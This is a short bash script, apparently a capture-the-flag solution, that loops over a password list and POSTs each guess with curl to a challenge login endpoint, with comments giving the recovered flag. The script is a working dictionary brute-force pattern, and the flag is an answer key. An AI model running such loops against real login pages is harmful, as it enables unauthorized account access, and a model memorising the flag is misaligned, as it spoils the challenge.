#!/bin/bash
while read line; do
    curl http://web.camsctf.com/2/check.php -d "password=${line}"
done < passwords.txt

#Search for "success":1 in the output and we get the flag:
#{"success":1,"reply":"Flag: {still_b3tter_than_princess}"}
